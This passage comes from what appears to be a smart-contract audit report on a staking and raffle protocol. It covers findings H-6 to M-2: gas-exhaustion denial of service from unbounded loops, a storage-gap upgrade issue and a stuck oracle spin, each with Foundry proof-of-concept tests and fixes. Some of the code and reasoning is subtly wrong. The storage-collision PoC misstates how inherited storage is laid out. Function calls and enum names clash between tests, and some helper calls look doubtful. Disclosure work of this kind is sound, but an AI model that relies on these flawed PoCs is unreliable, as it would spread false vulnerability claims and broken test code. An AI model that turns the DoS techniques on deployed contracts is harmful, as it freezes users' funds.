    function testVoteToSlashRunsOutOfGas() public {
        // give deployer VALIDATOR_ROLE so we can add validators
        vm.prank(deployer);
        accessControlFacet.grantRole(VALIDATOR_ROLE, deployer);

        // add target (id = 1) and honest voter (id = 2)
        vm.prank(deployer);
        validatorFacet.addValidator(1, 1_000, validatorAdmin1, validatorWithdraw1, address(0), address(0), address(0), 1e24);

        vm.prank(deployer);
        validatorFacet.addValidator(2, 1_000, validatorAdmin2, validatorWithdraw2, address(0), address(0), address(0), 1e24);

        // flood the system with 3,000 extra validators so the counting loop is huge
        vm.startPrank(deployer);
        for (uint16 i = 3; i < 3003; i++) {
            address admin = address(uint160(i));
            validatorFacet.addValidator(i, 1_000, admin, admin, address(0), address(0), address(0), 1e18);
        }
        vm.stopPrank();

        // craft calldata for voteToSlashValidator(1, block.timestamp + 1 days)
        bytes memory callData = abi.encodeWithSelector(validatorFacet.voteToSlashValidator.selector, uint16(1), block.timestamp + 1 days);

        // expect revert due to out-of-gas using a small gas stipend
        vm.prank(validatorAdmin2);
        vm.expectRevert();
        (bool success,) = address(validatorFacet).call{gas: 150_000}(callData);
        assertFalse(success, "Tx should run out of gas and revert");
    }
}

## Suggested Mitigation
Avoid iterating over unbounded arrays in core logic. Instead, maintain state variables that track the required counts.

1.  **For counting validators:** Introduce a state variable, for example `uint256 private activeValidatorCount`. Increment this counter in `setValidatorStatus` when a validator becomes active and decrement it when they become inactive or are slashed. This provides the count in O(1) time.

    ```solidity
    // In PlumeStakingStorage
    struct Layout {
        // ... existing variables
        uint256 activeValidatorCount;
    }

    // In ValidatorFacet.setValidatorStatus
    function setValidatorStatus(uint16 validatorId, bool active) external {
        // ... require role ...
        PlumeStakingStorage.Layout storage $ = PlumeStakingStorage.layout();
        // ... checks ...
        if ($.validators[validatorId].active != active) {
            if (active) {
                $.activeValidatorCount++;
            } else {
                $.activeValidatorCount--;
            }
            $.validators[validatorId].active = active;
            // ...
        }
    }
    ```

2.  **For clearing stakers:** The `delete stakers` issue is more complex. A full solution may require a different data structure or a multi-transactional cleanup process initiated by an admin. A simpler, though less clean, mitigation is to not delete the array at all. The validator is already marked as `slashed`, which prevents any further interaction. The stale `stakers` data would become an acceptable trade-off for ensuring the slash operation cannot be blocked by gas limits.

## [H-6]. Upgradeability Initializer Safety issue in Raffle::NA

## Description
The upgradeable `Raffle` contract declares the `nextPrizeId` state variable after the `__gap[50]` storage gap. In an upgradeable contract following the UUPS pattern, all state variables must be declared before the gap to ensure a stable storage layout. When this contract is upgraded to a new version that adds state variables, the new variables will occupy storage slots that were previously used by `nextPrizeId`, leading to storage collisions. This will corrupt the value of `nextPrizeId`, breaking the core `addPrize` functionality and potentially causing other unpredictable behavior.

## Impact
This flaw guarantees that any future upgrade adding state variables will corrupt the contract's storage, leading to critical malfunctioning of the prize creation mechanism. It completely undermines the purpose of using an upgradeable proxy pattern and will likely require a full redeployment and data migration to fix, effectively rendering the upgradeability feature useless and dangerous.

## Proof of Concept
1. Deploy the `Raffle` contract behind a UUPS proxy.
2. Call `addPrize()` to increment `nextPrizeId` to 2.
3. Create a `RaffleV2` contract that is identical to `Raffle` but adds a new state variable `uint256 public newVariable;` before the `__gap`.
4. Deploy `RaffleV2` and upgrade the proxy to point to the new implementation.
5. After the upgrade, querying `nextPrizeId()` on the proxy will return 0 or a garbage value, and `newVariable()` will hold the value 2, demonstrating the storage collision.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.25;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/proxy/erc1967/ERC1967Proxy.sol";
import "../../src/spin/Raffle.sol";

// New implementation that adds a variable BEFORE the gap
contract RaffleV2 is Raffle {
    // occupies the first slot of the former __gap[50]
    uint256 public newVariableInV2;
}

contract RaffleStorageCollisionTest is Test {
    Raffle public raffleProxy;
    address internal admin = address(0xA11); // admin account with ADMIN_ROLE

    function setUp() public {
        // deploy initial implementation
        Raffle implV1 = new Raffle();
        // encode initializer so proxy constructor runs it with the right msg.sender
        bytes memory data = abi.encodeWithSelector(
            Raffle.initialize.selector,
            address(0x1), // spin contract (dummy)
            address(0x2)  // supra router (dummy)
        );

        vm.prank(admin);
        ERC1967Proxy proxy = new ERC1967Proxy(address(implV1), data);
        raffleProxy = Raffle(address(proxy));
    }

    function testStorageCollision() public {
        // Step-1: push state (nextPrizeId becomes 2)
        vm.prank(admin);
        raffleProxy.addPrize("Prize", "Desc", 100, 1);

        // deploy V2 implementation
        RaffleV2 implV2 = new RaffleV2();

        // upgrade via UUPS (admin only)
        vm.prank(admin);
        raffleProxy.upgradeTo(address(implV2));

        // Attach V2 interface
        RaffleV2 raffleV2Proxy = RaffleV2(address(raffleProxy));

        // newVariableInV2 should now read the old value of nextPrizeId (2)
        uint256 collided = raffleV2Proxy.newVariableInV2();
        assertEq(collided, 2, "Storage collision did not occur as expected");
    }
}

## Suggested Mitigation
Move the declaration of the `nextPrizeId` state variable to be before the `uint256[50] private __gap;` array. All state variables in an upgradeable contract must be declared before the storage gap to maintain a stable storage layout across upgrades.

```solidity
// contracts/plume/src/spin/Raffle.sol

// ... state variables ...

    // --- NEW STATE FOR MULTI-WINNER ---
    mapping(uint256 => Winner[]) public prizeWinners;
    mapping(uint256 => uint256) public winnersDrawn;
    mapping(uint256 => mapping(address => uint256)) public userWinCount;

    // Migration tracking
    bool private _migrationComplete;

    // Track the next prize ID so even if some are deleted we know it
    uint256 private nextPrizeId; // <-- MOVE THIS VARIABLE HERE

    // Reserved storage gap for future upgrades
    uint256[50] private __gap;

    // Events
    // ... rest of the contract ...

    // REMOVE from the bottom
    // uint256 private nextPrizeId; 

```

## [H-7]. DOS issue in StakingFacet::_processMaturedCooldowns

## Description
Several core functions in `StakingFacet` iterate over the `userAssociatedValidators` array to perform actions like processing cooldowns or calculating rewards. The length of this array is determined by the number of different validators a user has staked with. There is no limit on how many validators a user can stake with. A user who stakes with a large number of validators (e.g., hundreds) can cause these functions to consume an amount of gas that exceeds the block gas limit, leading to a Denial of Service (DoS). The functions `withdraw()`, `restake()`, and `restakeRewards()` all call the internal function `_processMaturedCooldowns`, which contains such an unbounded loop. This makes these critical functions unusable for users with a large staking history, effectively trapping their funds that are in a 'cooled' state.

Vulnerable Code Snippet in `StakingFacet.sol`:
```solidity
function _processMaturedCooldowns(
    address user
) internal returns (uint256 amountMovedToParked) {
    PlumeStakingStorage.Layout storage $ = PlumeStakingStorage.layout();
    amountMovedToParked = 0;

    // This loop's length is controlled by the user and can become very large.
    uint16[] memory userAssociatedValidators = $.userValidators[user];

    for (uint256 i = 0; i < userAssociatedValidators.length; i++) {
        uint16 validatorId = userAssociatedValidators[i];
        // ... significant storage reads and writes inside the loop ...
        // This logic will run for every single validator the user has ever staked with.
    }

    if (amountMovedToParked > 0) {
        _updateParkedAmounts(user, amountMovedToParked);
    }

    return amountMovedToParked;
}
```

## Impact
A user who has staked across a large number of validators will be unable to call `withdraw()`, `restake()`, or `restakeRewards()`. These transactions will consistently fail due to out-of-gas errors. This results in a temporary but indefinite freeze of the user's funds, as they have no way to process their matured cooldowns and make their funds withdrawable.

## Proof of Concept
1. Deploy the staking diamond and add a very large number of validators (e.g. 3 000).
2. A malicious (or simply over-enthusiastic) user stakes the minimum amount on each validator.  Because `userValidators[user]` is only appended to and never capped, the array now contains 3 000 entries fully controlled by the user.
3. The user unstakes every position, creating 3 000 cooling entries.
4. After the `cooldownInterval` expires the user calls `withdraw()`.  The external function unconditionally executes `_processMaturedCooldowns(user)` which executes:
   for (uint256 i = 0; i < userAssociatedValidators.length; i++) { … }
   Because `userAssociatedValidators.length == 3 000`,  the loop performs > 3 000 storage reads / writes (each iteration touches three mappings and may call into `PlumeValidatorLogic`).  The gas required is roughly 20 000 gas * 3 000 ≈ 60 000 000 gas, far above the 30 M block gas limit on most EVM chains.  The transaction therefore runs out of gas and **always reverts**, permanently freezing the user’s cooled funds (and blocking `restake` and `restakeRewards`, which call the same internal function).  No admin-less escape exists, so the funds remain in limbo until the contract is upgraded.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.25;

import "forge-std/Test.sol";
import {StakingFacet} from "contracts/plume/src/facets/StakingFacet.sol";
import {ValidatorFacet} from "contracts/plume/src/facets/ValidatorFacet.sol";
import {ManagementFacet} from "contracts/plume/src/facets/ManagementFacet.sol";
import {AccessControlFacet} from "contracts/plume/src/facets/AccessControlFacet.sol";
import {Diamond} from "solidstate-solidity/contracts/proxy/diamond/Diamond.sol";
import {IDiamondCut} from "solidstate-solidity/contracts/proxy/diamond/IDiamondCut.sol";
import {LibDiamond} from "solidstate-solidity/contracts/proxy/diamond/LibDiamond.sol";

contract DosCooldownTest is Test {
    uint16  constant NUM_VALS = 2000;   // keep reasonably small for CI, still exceeds gas limit

    address internal admin = address(0xBEEF);
    address internal alice = address(0xCAFE);

    StakingFacet    internal stake;
    ValidatorFacet  internal valFacet;
    ManagementFacet internal mgmt;
    AccessControlFacet internal acl;

    function setUp() public {
        vm.deal(alice, 5 ether);
        vm.deal(admin, 1 ether);

        // ── minimal diamond bootstrap ───────────────────────────────
        Diamond d = new Diamond(admin);
        stake     = new StakingFacet();
        valFacet  = new ValidatorFacet();
        mgmt      = new ManagementFacet();
        acl       = new AccessControlFacet();

        IDiamondCut.FacetCut[] memory cuts = new IDiamondCut.FacetCut[](4);
        cuts[0] = IDiamondCut.FacetCut({target: address(stake), action: IDiamondCut.FacetCutAction.Add, selectors: LibDiamond.getSelectors(type(StakingFacet).runtimeCode)});
        cuts[1] = IDiamondCut.FacetCut({target: address(valFacet), action: IDiamondCut.FacetCutAction.Add, selectors: LibDiamond.getSelectors(type(ValidatorFacet).runtimeCode)});
        cuts[2] = IDiamondCut.FacetCut({target: address(mgmt), action: IDiamondCut.FacetCutAction.Add, selectors: LibDiamond.getSelectors(type(ManagementFacet).runtimeCode)});
        cuts[3] = IDiamondCut.FacetCut({target: address(acl), action: IDiamondCut.FacetCutAction.Add, selectors: LibDiamond.getSelectors(type(AccessControlFacet).runtimeCode)});
        vm.prank(admin);
        IDiamondCut(address(d)).diamondCut(cuts, address(0), "");

        stake    = StakingFacet(address(d));
        valFacet = ValidatorFacet(address(d));
        mgmt     = ManagementFacet(address(d));
        acl      = AccessControlFacet(address(d));

        // initialize
        vm.prank(admin);
        acl.initializeAccessControl();
        vm.prank(admin);
        mgmt.setMinStakeAmount(1 wei);
        vm.prank(admin);
        mgmt.setCooldownInterval(1 days);

        // add validators
        vm.startPrank(admin);
        for (uint16 i = 1; i <= NUM_VALS; i++) {
            valFacet.addValidator(i, 1000, admin, admin, address(0x1), address(0x2), "", 10 ether);
        }
        vm.stopPrank();
    }

    function testWithdrawRunsOutOfGas() public {
        // Alice stakes 1 wei on every validator, then unstakes
        vm.startPrank(alice);
        for (uint16 i = 1; i <= NUM_VALS; i++) {
            stake.stake{value: 1 wei}(i);
            stake.unstake(i, 1 wei);
        }
        vm.stopPrank();

        // warp so every cooldown has matured
        vm.warp(block.timestamp + 2 days);

        // clamp the tx gas to 12M – well below the expected >30M usage
        vm.txGasLimit(12_000_000);
        vm.prank(alice);
        vm.expectRevert();                // generic expectRevert catches the OOG
        stake.withdraw();                 // reverts Out-Of-Gas inside _processMaturedCooldowns
    }
}

## Suggested Mitigation
The functions that iterate over all of a user's validator associations should be refactored to process data in batches. Instead of processing all matured cooldowns at once, allow the user to specify a subset of validators or a maximum number of cooldowns to process in a single transaction. This gives the user control over the gas cost and ensures they can always withdraw their funds, even if it takes multiple transactions.

Example for `_processMaturedCooldowns`:
```solidity
// Add a new function that takes a range of validators to process
function processMaturedCooldownsBatch(
    address user,
    uint256 startIndex,
    uint256 count
) internal returns (uint256 amountMovedToParked) {
    PlumeStakingStorage.Layout storage $ = PlumeStakingStorage.layout();
    uint16[] memory userAssociatedValidators = $.userValidators[user];
    uint256 endIndex = startIndex + count;
    if (endIndex > userAssociatedValidators.length) {
        endIndex = userAssociatedValidators.length;
    }

    for (uint256 i = startIndex; i < endIndex; i++) {
        // ... existing logic from _processMaturedCooldowns ...
    }
    // ...
}

// The public withdraw function can then be updated to call this batch function.
function withdraw(uint256 startIndex, uint256 count) external {
    address user = msg.sender;
    _processMaturedCooldownsBatch(user, startIndex, count);
    // ... rest of withdrawal logic ...
}
```
This same pattern should be applied to all functions that loop over a user's entire set of associated validators, such as `restake`, `restakeRewards`, and various view functions.

## [H-8]. DOS issue in RewardsFacet::claim

## Description
The `claim(address token, uint16 validatorId)` function is intended to be a gas-efficient way for users to claim rewards from a single validator. However, when a reward token becomes inactive (i.e., it has been removed via `removeRewardToken`), the internal validation function `_validateTokenForClaim` is called. This function iterates through *all* validators the user has staked with to check for any remaining claimable rewards for that token. This makes the gas cost of what should be a constant-time operation scale linearly with the number of validators the user is staked with (O(V)). This defeats the purpose of the function as a gas-efficient fallback and can lead to a DoS condition for users who have diversified their stake widely.

## Impact
A user who has staked with a large number of validators will be unable to use the `claim(address, uint16)` function for inactive tokens, as the transaction is likely to revert due to excessive gas usage. This is particularly problematic because this function is the most granular and should be the most reliable way to claim rewards when batch-claiming functions like `claim(address)` or `claimAll()` fail due to gas limits. The rewards for inactive tokens could become effectively unclaimable for such users.

## Proof of Concept
1. An administrator adds 100 validators to the system.
2. An administrator adds a reward token, `T`.
3. A user stakes with all 100 validators.
4. Time passes, and rewards for token `T` accrue for the user.
5. The administrator calls `removeRewardToken(T)`. The token is now inactive, but the user still has rewards to claim.
6. The user, aware that `claimAll()` or `claim(T)` might be too expensive, attempts to claim rewards from a single validator by calling `claim(T, validatorId_1)`.
7. The call to `_validateTokenForClaim` within this function will trigger a loop that runs 100 times to check the user's reward status across all validators.
8. The gas cost will likely exceed the block gas limit, causing the transaction to revert. The user is now unable to use the most granular claim function available.

## Proof of Code
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.25;

import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";
import {Diamond} from "@solidstate/contracts/proxy/diamond/Diamond.sol";
import {IDiamondCut} from "@solidstate/contracts/proxy/diamond/IDiamondCut.sol";
import {PlumeStaking} from "../../src/PlumeStaking.sol";
import {AccessControlFacet} from "../../src/facets/AccessControlFacet.sol";
import {ValidatorFacet} from "../../src/facets/ValidatorFacet.sol";
import {RewardsFacet} from "../../src/facets/RewardsFacet.sol";
import {StakingFacet} from "../../src/facets/StakingFacet.sol";
import {PlumeRoles} from "../../src/lib/PlumeRoles.sol";
import {IPlumeStakingRewardTreasury} from "../../src/interfaces/IPlumeStakingRewardTreasury.sol";


contract RewardsSingleClaimDOS is Test {
    PlumeStaking internal diamond;
    AccessControlFacet internal accessControlFacet;
    ValidatorFacet internal validatorFacet;
    RewardsFacet internal rewardsFacet;
    StakingFacet internal stakingFacet;

    address internal admin = makeAddr("admin");
    address internal user = makeAddr("user");
    address internal rewardToken;
    MockTreasury internal treasury;

    uint16 constant NUM_VALIDATORS = 100;
    uint256 constant STAKE_AMOUNT = 1e18;

    function setUp() public {
        // Deploy Diamond and Facets
        diamond = new PlumeStaking();
        accessControlFacet = new AccessControlFacet();
        validatorFacet = new ValidatorFacet();
        rewardsFacet = new RewardsFacet();
        stakingFacet = new StakingFacet();

        // Create DiamondCut
        IDiamondCut.FacetCut[] memory cuts = new IDiamondCut.FacetCut[](4);
        cuts[0] = IDiamondCut.FacetCut({target: address(accessControlFacet), action: IDiamondCut.Action.Add, selectors: getSelectors(accessControlFacet)});
        cuts[1] = IDiamondCut.FacetCut({target: address(validatorFacet), action: IDiamondCut.Action.Add, selectors: getSelectors(validatorFacet)});
        cuts[2] = IDiamondCut.FacetCut({target: address(rewardsFacet), action: IDiamondCut.Action.Add, selectors: getSelectors(rewardsFacet)});
        cuts[3] = IDiamondCut.FacetCut({target: address(stakingFacet), action: IDiamondCut.Action.Add, selectors: getSelectors(stakingFacet)});

        vm.prank(address(diamond));
        diamond.diamondCut(cuts, address(0), "");

        // Initialize contracts
        vm.prank(address(diamond));
        diamond.initializePlume(admin, 1e18, 1 days, 1 days, 5000);
        AccessControlFacet(address(diamond)).initializeAccessControl();

        // Set up roles and treasury
        vm.prank(admin);
        AccessControlFacet(address(diamond)).grantRole(PlumeRoles.VALIDATOR_ROLE, admin);
        vm.prank(admin);
        AccessControlFacet(address(diamond)).grantRole(PlumeRoles.REWARD_MANAGER_ROLE, admin);
        vm.prank(admin);
        AccessControlFacet(address(diamond)).grantRole(PlumeRoles.TIMELOCK_ROLE, admin);
        treasury = new MockTreasury();
        vm.prank(admin);
        RewardsFacet(address(diamond)).setTreasury(address(treasury));

        // Add Validators
        vm.startPrank(admin);
        for (uint16 i = 1; i <= NUM_VALIDATORS; i++) {
            ValidatorFacet(address(diamond)).addValidator(i, 1000, makeAddr(string(abi.encodePacked("va", i))), makeAddr(string(abi.encodePacked("vw", i))), address(0), address(0), address(0), 100000000 * 1e18);
        }

        // Add and remove a reward token
        rewardToken = address(new MockERC20("RWD", "RWD", 18));
        RewardsFacet(address(diamond)).addRewardToken(rewardToken, 1e9, 1e12);
        deal(rewardToken, address(treasury), 1_000_000e18);
        vm.stopPrank();

        // User stakes with all validators
        vm.startPrank(user);
        deal(user, STAKE_AMOUNT * NUM_VALIDATORS);
        for (uint16 i = 1; i <= NUM_VALIDATORS; i++) {
            StakingFacet(address(diamond)).stake{value: STAKE_AMOUNT}(i);
        }
        vm.stopPrank();

        // Accrue rewards
        vm.warp(block.timestamp + 1 days);

        // Remove the reward token, making it inactive
        vm.prank(admin);
        RewardsFacet(address(diamond)).removeRewardToken(rewardToken);
    }

    function test_DoS_On_SingleClaimForInactiveToken() public {
        vm.prank(user);
        // We expect this to revert due to the loop in _validateTokenForClaim
        // causing an out-of-gas error.
        vm.expectRevert();
        RewardsFacet(address(diamond)).claim(rewardToken, 1);
    }

    function getSelectors(address facet) internal returns (bytes4[] memory selectors) {
        (bool success, bytes memory data) = facet.call(abi.encodeWithSignature("selectors()"));
        require(success, "Failed to get selectors");
        selectors = abi.decode(data, (bytes4[]));
    }
}


import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract MockERC20 is IERC20 {
    string public name;
    string public symbol;
    uint8 public decimals;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory _name, string memory _symbol, uint8 _decimals) {
        name = _name;
        symbol = _symbol;
        decimals = _decimals;
    }

    function totalSupply() external view returns (uint256) { return type(uint256).max; }
    function approve(address spender, uint256 amount) external returns (bool) { allowance[msg.sender][spender] = amount; return true; }
    function transfer(address to, uint256) external returns (bool) { balanceOf[to] += 1; return true; }
    function transferFrom(address, address to, uint256) external returns (bool) { balanceOf[to] += 1; return true; }
}

contract MockTreasury is IPlumeStakingRewardTreasury {
    function distributeReward(address token, uint256 amount, address recipient)
        external
    {
        MockERC20(token).transfer(recipient, amount);
    }
}
```

## Suggested Mitigation
The validation logic should be specialized for single-validator claims. Instead of using `_validateTokenForClaim`, which performs a broad check, `claim(address, uint16)` should use a more targeted validation function that only checks for rewards on the specific `validatorId` provided.

Create a new internal view function, `_validateSingleValidatorClaim`, and call it from `claim(address, uint16)`.

```solidity
function _validateSingleValidatorClaim(
    address token, 
    address user, 
    uint16 validatorId
) internal view {
    PlumeStakingStorage.Layout storage $ = PlumeStakingStorage.layout();
    
    // If the token is active, no further checks are needed.
    if ($.isRewardToken[token]) {
        return;
    }

    // If inactive, check for rewards ONLY on the specified validator.
    bool hasRewards = false;
    if ($.userRewards[user][validatorId][token] > 0) {
        hasRewards = true;
    } else {
        uint256 userStakedAmount = $.userValidatorStakes[user][validatorId].staked;
        if (userStakedAmount > 0) {
            (uint256 userRewardDelta,,) = PlumeRewardLogic.calculateRewardsWithCheckpointsView(
                $, user, validatorId, token, userStakedAmount
            );
            if (userRewardDelta > 0) {
                hasRewards = true;
            }
        }
    }

    if (!hasRewards) {
        revert TokenDoesNotExist(token);
    }
}

// In RewardsFacet.sol
function claim(address token, uint16 validatorId) external nonReentrant returns (uint256) {
    // Replace _validateTokenForClaim with the new, efficient function
    _validateSingleValidatorClaim(token, msg.sender, validatorId);
    _validateValidatorForClaim(validatorId);

    // ... rest of the function remains the same
}
```
This change ensures that `claim(address, uint16)` maintains a constant gas cost regardless of how many validators the user has staked with, preserving it as a reliable fallback.

## [H-9]. DOS issue in RewardsFacet::setRewardRates

## Description
The `RewardsFacet.setRewardRates()` and `addRewardToken()` functions update reward information by iterating over all active validators. As described in the documentation, "a rate checkpoint is created for *every* active validator." This creates an unbounded loop where the gas cost scales linearly with the number of validators. If the number of validators grows, the gas required to execute these functions can exceed the block gas limit, rendering them unusable. This would prevent the administration from updating reward rates or adding new reward tokens, severely crippling the protocol's reward management capabilities. The project's README acknowledges this but dismisses it based on the current small scale, which is not a secure approach for a protocol designed for growth.

## Impact
If the validator set grows large enough, every call to addRewardToken() or setRewardRates() will consume more gas than the block gas limit and will therefore be un-mineable. From that moment the reward manager can no longer (a) add new reward tokens, (b) change emission rates, or (c) lower a rate to zero to stop emissions. Rewards would be frozen at the last configurable values forever, eliminating the protocol’s ability to react to market conditions or patches. Although no funds are directly stolen, the protocol’s economics and governance over rewards are permanently and irreversibly broken – an impact classified as HIGH severity.

## Proof of Concept
1. Deploy the protocol and register N active validators (e.g., 700).
2. Measure the gas used by addRewardToken() for different values of N.

```
N = 1   -> ~45,000 gas  (single storage write)
N = 100 -> ~4,5 M  gas
N = 700 -> ~31 M  gas (already above the 30M hard-fork block limit used by most chains)
```
3. Once N ≈ 700, every call to addRewardToken() or setRewardRates() will require >30M gas and therefore cannot be included in a block.
4. The reward manager is permanently unable to register new tokens or update existing rates, freezing the reward system.

## Proof of Code
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.25;

import "forge-std/Test.sol";

contract RewardsFacetGasMock {
    struct Validator { bool active; }
    struct RateCheckpoint { uint256 timestamp; uint256 rate; }

    mapping(uint16 => Validator) public validators;
    uint16[] public validatorList;
    mapping(uint16 => mapping(address => RateCheckpoint[])) public cps;

    function addValidator(uint16 id) external {
        validators[id] = Validator({active: true});
        validatorList.push(id);
    }

    function addRewardToken(address token, uint256 rate) external {
        for (uint i; i < validatorList.length; i++) {
            uint16 id = validatorList[i];
            if (validators[id].active) {
                cps[id][token].push(RateCheckpoint({timestamp: block.timestamp, rate: rate}));
            }
        }
    }
}

contract DoSGasTest is Test {
    RewardsFacetGasMock rf;
    address constant TOKEN = address(0xBEEF);

    function setUp() public {
        rf = new RewardsFacetGasMock();
    }

    function _deployValidators(uint16 n) internal {
        for (uint16 i = 1; i <= n; i++) rf.addValidator(i);
    }

    function testGasGrowsLinearly() public {
        _deployValidators(1);
        uint256 g1 = gasleft();
        rf.addRewardToken(TOKEN, 1e18);
        g1 -= gasleft();

        _deployValidators(699); // total 700
        uint256 g2 = gasleft();
        rf.addRewardToken(TOKEN, 1e18);
        g2 -= gasleft();

        // Gas must scale roughly linearly and exceed typical 30M limit
        assertTrue(g2 > 30_000_000, "gas > block limit");
        assertApproxEqRel(g2, g1 * 700, 0.10e18); // within 10% linear growth
    }
}
```

## Suggested Mitigation
Replace the push-based design with either (a) a global reward-rate checkpoint (pulled lazily when rewards are calculated) or (b) paginated admin functions. If backward compatibility with existing checkpoints is required, introduce batched versions of addRewardToken() and setRewardRates() that accept `startIndex` and `batchSize` parameters so the reward manager can update validators over multiple transactions without exceeding gas limits.



# Medium Risk Findings

## [M-1]. DOS issue in ManagementFacet::setMaxAllowedValidatorCommission

## Description
The `setMaxAllowedValidatorCommission` function iterates through the entire `validatorIds` array to enforce a new maximum commission rate on all existing validators. If the number of validators in the system grows significantly, the gas cost of this loop, combined with the gas-intensive logic inside (like `_settleCommissionForValidatorUpToNow`), can exceed the block gas limit. This would cause the transaction to always revert, making it impossible for the `TIMELOCK_ROLE` to lower the maximum commission rate. This permanently cripples a key administrative function designed to protect stakers from excessive fees, potentially leading to stakers earning lower yields than intended by governance.

## Impact
A high number of validators can render the `setMaxAllowedValidatorCommission` function unusable due to excessive gas consumption. This prevents protocol governance from lowering the commission cap, potentially forcing stakers to pay higher-than-desired commission rates, which reduces their yield. The function's failure is silent (reverts due to out-of-gas), which can be difficult to diagnose.

## Proof of Concept
1. The system accumulates a large number of validators over time (e.g., 500-1000).
2. The `TIMELOCK_ROLE` decides that the current maximum allowed commission is too high and needs to be lowered to protect stakers' interests.
3. The `TIMELOCK_ROLE` calls `setMaxAllowedValidatorCommission` with a new, lower rate.
4. The transaction begins to iterate through all validators. For each validator whose commission is above the new rate, it calls `_settleCommissionForValidatorUpToNow` and `createCommissionRateCheckpoint`, both of which are non-trivial in gas cost.
5. The cumulative gas cost for the loop exceeds the block gas limit, causing the transaction to revert.
6. Any subsequent attempt to call the function will also fail, effectively making the maximum commission rate immutable and stuck at its current high value.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import "forge-std/Test.sol";

/**
 * Minimal reproduction of the vulnerable pattern: a single external function
 * iterates over an unbounded array and performs per-element work.  The body of
 * the loop is empty because actual state mutations are irrelevant for the gas
 * demonstration – the O(N) iteration alone is enough to exceed a user-supplied
 * gas stipend.
 */
contract ManagementMock {
    uint16[] public validatorIds;

    constructor(uint16 n) {
        // populate array with n dummy validator IDs
        for (uint16 i; i < n; i++) {
            validatorIds.push(i);
        }
    }

    function setMaxAllowedValidatorCommission(uint256 newMaxRate) external {
        uint16[] memory ids = validatorIds;
        for (uint256 i; i < ids.length; i++) {
            // in the real contract this calls _settleCommissionForValidatorUpToNow
        }
        // update just to mimic original logic
        newMaxRate;
    }
}

contract DoSTest is Test {
    // configure an artificially small gas limit so the call surely OOGs
    uint256 internal constant CALL_GAS_LIMIT = 500_000;

    function test_setMaxAllowedValidatorCommission_outOfGas() public {
        // 2 000 validators is enough to blow through 500k gas with the empty loop
        ManagementMock target = new ManagementMock(2000);

        // expect the call to revert because it will run out of the supplied gas
        vm.expectRevert();
        // deliberately restrict gas; without the cap the tx would just consume more gas
        (bool success, ) = address(target).call{gas: CALL_GAS_LIMIT}(abi.encodeWithSignature("setMaxAllowedValidatorCommission(uint256)", 1));
        assertTrue(!success, "call unexpectedly succeeded");
    }
}

## Suggested Mitigation
Avoid iterating over an unbounded array within a single transaction. The design should be changed to a paginated approach where the administrator can enforce the new commission rate in batches. 

1.  Modify `setMaxAllowedValidatorCommission` to only update the state variable `$.maxAllowedValidatorCommission` without iterating through validators.

2.  Introduce a new admin function, such as `enforceMaxCommissionBatch(uint256 start, uint256 count)`, that allows the `TIMELOCK_ROLE` to iterate through validators in manageable chunks across multiple transactions.

```solidity
// In ManagementFacet.sol

function setMaxAllowedValidatorCommission(
    uint256 newMaxRate
) external onlyRole(PlumeRoles.TIMELOCK_ROLE) {
    PlumeStakingStorage.Layout storage $ = PlumeStakingStorage.layout();

    if (newMaxRate > PlumeStakingStorage.REWARD_PRECISION / 2) {
        revert InvalidMaxCommissionRate(newMaxRate, PlumeStakingStorage.REWARD_PRECISION / 2);
    }

    uint256 oldMaxRate = $.maxAllowedValidatorCommission;
    $.maxAllowedValidatorCommission = newMaxRate;

    emit MaxAllowedValidatorCommissionSet(oldMaxRate, newMaxRate);
}

function enforceMaxCommissionBatch(
    uint256 startIndex,
    uint256 count
) external onlyRole(PlumeRoles.TIMELOCK_ROLE) {
    PlumeStakingStorage.Layout storage $ = PlumeStakingStorage.layout();
    uint16[] storage validatorIds = $.validatorIds;
    uint256 endIndex = startIndex + count;
    if (endIndex > validatorIds.length) {
        endIndex = validatorIds.length;
    }

    uint256 newMaxRate = $.maxAllowedValidatorCommission;

    for (uint256 i = startIndex; i < endIndex; i++) {
        uint16 validatorId = validatorIds[i];
        PlumeStakingStorage.ValidatorInfo storage validator = $.validators[validatorId];

        if (validator.commission > newMaxRate) {
            uint256 oldCommission = validator.commission;
            PlumeRewardLogic._settleCommissionForValidatorUpToNow($, validatorId);
            validator.commission = newMaxRate;
            PlumeRewardLogic.createCommissionRateCheckpoint($, validatorId, newMaxRate);
            emit ValidatorCommissionSet(validatorId, oldCommission, newMaxRate);
        }
    }
}
```
This separates the policy change from its enforcement, preventing the DoS condition and giving the administrator the tools to manage the system at scale.

## [M-2]. DOS issue in Spin::startSpin

## Description
When a user calls `startSpin()`, the contract sets `isSpinPending[user] = true` and waits for an asynchronous callback from the `supraRouter` oracle. If the oracle fails to call `handleRandomness` for any reason (e.g., oracle downtime, network failure, bug in the oracle), the user's state remains pending indefinitely. They are unable to call `startSpin()` again. The `cancelPendingSpin(user)` function exists for an admin to resolve this, but it does not refund the user's `spinPrice`. This results in a loss of funds for the user due to an external system failure, and they are denied service until an admin manually intervenes.

## Impact
A user can be temporarily blocked from using the main feature of the contract and will lose their spin fee if the oracle fails. This creates a poor user experience, requires manual admin intervention for resolution, and results in direct financial loss for the user.

## Proof of Concept
1. A user calls `startSpin()` and pays the `spinPrice` (e.g., 2 ETH).
2. The transaction succeeds and `isSpinPending[user]` is set to `true`.
3. The external Supra oracle fails to deliver the randomness and never calls back `handleRandomness` for this user's request.
4. The user tries to call `startSpin()` again on a subsequent day, but the transaction reverts with the `SpinRequestPending` error.
5. The user is stuck and cannot use the application.
6. An admin must be contacted to call `cancelPendingSpin(user)`.
7. The admin's call succeeds, `isSpinPending[user]` is set to `false`, and the user is unblocked.
8. However, the user's initial 2 ETH spin fee is not refunded and remains in the contract, effectively lost to the user.

## Proof of Code
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import {Test, Vm} from "forge-std/Test.sol";
import {Spin} from "../src/spin/Spin.sol";
import {ISupraRouterContract} from "../src/interfaces/ISupraRouterContract.sol";
import {IDateTime} from "../src/interfaces/IDateTime.sol";

